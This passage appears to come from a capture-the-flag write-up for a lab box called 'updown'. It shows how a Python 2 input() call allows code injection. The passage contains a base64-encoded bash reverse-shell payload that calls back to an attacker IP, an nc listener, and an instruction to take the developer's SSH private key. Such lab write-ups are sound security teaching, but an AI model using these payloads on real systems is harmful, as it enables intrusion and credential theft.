Check out the developer user's home directory to see a couple of files www-data can read and execute:
```bash
www-data@updown:/home/developer/dev$ ls
siteisup  siteisup_test.py
```
```python
# siteisup_test.py
import requests

url = input("Enter URL here:")
page = requests.get(url)
if page.status_code == 200:
        print "Website is up"
else:
        print "Website is down"
```
Running ```siteisup``` shows that it's just a wrapper for calling the python script. Since this is python2 (look at the print statements), the input function is going to be vulnerable to command injection.
```bash
$ ./siteisup
Welcome to 'siteisup.htb' application
# again the base64 is just an encoded rev shell payload since putting it in there normally wasn't playing nice
Enter URL here:eval("__import__('os').system('echo -n YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuNC85MDAyICAwPiYx | base64 -d | bash')")
```
```bash
# listener on attacking machine
$ nc -lvnp 9002
listening on [any] 9002 ...
connect to [10.10.14.4] from (UNKNOWN) [10.10.11.177] 47680
developer@updown:/home/developer/dev$ id
uid=1002(developer) gid=33(www-data) groups=33(www-data)
```
Now go ahead and grab the private key from developers ```.ssh``` directory to get a nice ssh session